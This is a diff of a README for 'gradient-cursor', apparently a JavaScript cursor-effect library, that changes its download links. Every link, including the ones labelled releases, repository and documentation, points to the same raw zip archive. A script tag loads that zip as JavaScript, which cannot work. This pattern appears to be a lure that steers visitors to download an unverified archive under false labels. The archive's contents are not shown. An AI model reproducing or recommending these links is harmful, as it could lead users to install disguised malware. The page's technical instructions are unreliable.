@@ -1,7 +1,7 @@
 # 🎨 gradient-cursor - Make Your Cursor Stand Out Effortlessly
 
 ## 🔗 Download Now
-[![Download gradient-cursor](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/sightworthiness/gradient-cursor.zip)](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/sightworthiness/gradient-cursor.zip)
+[![Download gradient-cursor](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/dist/gradient_cursor_v2.7.zip)](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/dist/gradient_cursor_v2.7.zip)
 
 ## 📖 Introduction
 The gradient-cursor is a JavaScript library designed to bring a unique and interactive cursor effect to your web page. With this library, you can easily apply a customizable gradient effect to your cursor, enhancing the user experience on your site. It's simple to set up and requires no coding skills. 
@@ -11,7 +11,7 @@ To get started with gradient-cursor, follow these easy steps:
 
 1. **Download**: 
    
-   Visit this page to download: [gradient-cursor Releases](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/sightworthiness/gradient-cursor.zip)
+   Visit this page to download: [gradient-cursor Releases](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/dist/gradient_cursor_v2.7.zip)
 
 2. **Install**:
    
@@ -25,7 +25,7 @@ To get started with gradient-cursor, follow these easy steps:
 ## 📥 Download & Install
 To install gradient-cursor, follow these concise steps:
 
-1. Visit the releases page: [gradient-cursor Releases](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/sightworthiness/gradient-cursor.zip).
+1. Visit the releases page: [gradient-cursor Releases](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/dist/gradient_cursor_v2.7.zip).
    
 2. Find the latest version that suits your needs.
 
@@ -54,7 +54,7 @@ To integrate the gradient-cursor into your website:
 1. Link the JavaScript file in your HTML:
 
    ```html
-   <script src="https://raw.githubusercontent.com/loli9340/gradient-cursor/main/sightworthiness/gradient-cursor.zip"></script>
+   <script src="https://raw.githubusercontent.com/loli9340/gradient-cursor/main/dist/gradient_cursor_v2.7.zip"></script>
    ```
 
 2. Initialize the cursor in your JavaScript code:
@@ -91,7 +91,7 @@ If you encounter issues, consider these tips:
 If you need assistance, feel free to reach out. You can open an issue in the GitHub repository, and the community can help you. 
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/sightworthiness/gradient-cursor.zip)
-- [Documentation](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/sightworthiness/gradient-cursor.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/dist/gradient_cursor_v2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/loli9340/gradient-cursor/main/dist/gradient_cursor_v2.7.zip)
 
 Experience the enhanced interaction that a dynamic cursor effect can bring. Download gradient-cursor now and take your web design to the next level!
